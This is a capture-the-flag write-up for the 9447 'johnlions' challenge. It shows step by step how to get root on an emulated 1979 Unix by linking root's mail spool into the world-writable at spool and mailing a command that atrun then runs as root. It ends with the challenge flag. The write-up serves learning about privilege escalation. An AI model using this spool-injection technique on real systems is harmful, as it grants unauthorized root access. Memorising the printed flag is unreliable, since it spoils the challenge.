#9447 CTF - johnlions (writeup)


####Description

 - johnlions (250pts)
 - telnet johnlions.9447.plumbing
 - login ctf


####Playing

The first thing done was to list the content of current dir. This revealed the precious flag, but as expected I couldn't read it.  
```
$ ls -la
total 134
drwxrwxr-x 9 root      272 Sep 22 06:38 .
drwxrwxr-x 9 root      272 Sep 22 06:38 ..
drwxrwxr-x 2 bin      2512 Sep 22 06:38 bin
-rwxr-xr-x 1 bin      8986 Jun  8  1979 boot
drwxrwxr-x 2 bin       208 Sep 22 05:56 dev
drwxrwxr-x 2 bin       336 Sep 22 06:24 etc
-r-------- 1 root       28 Sep 22 06:25 flag
drwxrwxr-x 2 bin       320 Sep 22 05:33 lib
drwxrwxr-x 2 root       96 Sep 22 05:46 mdec
drwxrwxrwx 2 root      112 Sep 22 06:36 tmp
-rwxr-xr-x 1 root    51982 Jun  8  1979 unix
drwxrwxr-x12 root      208 Sep 22 05:58 usr
$ cat flag
cat: can't open flag
```

The next thing done was to look for suid binaries and check if some of them can be used to 
escalate privileges.

```
$ find / -user root -perm -4000 -print
/bin/mv
/bin/login
/bin/mail
/bin/mkdir
/bin/newgrp
/bin/passwd
/bin/su
/bin/rmdir
/usr/lib/atrun
```


The /usr/lib/atrun seemed an interesting vector, it runs jobs queued by 'at'. This was abused in the past to execute commands as root. The attack is possible because the /usr/spool/at is writable by anyone. What is needed is to create a file in a specific format in this directory and wait for atrun to execute it. We can create a link to a file owned by root and try to inject our commands there.

#### The attack

Create the link
```
$ ln /usr/spool/mail/root /usr/spool/at/88.265.0824.21
```

Now send a mail to root with the command you want to execute
```
$ mail root
chmod 777 /flag
```

Wait and see the result
```
$ ls -la /flag
-rwxrwxrwx 1 root       28 Sep 22 06:25 /flag
$ cat /flag
9447{h4cking_like_its_1979}
```

###The flag: 9447{h4cking_like_its_1979}
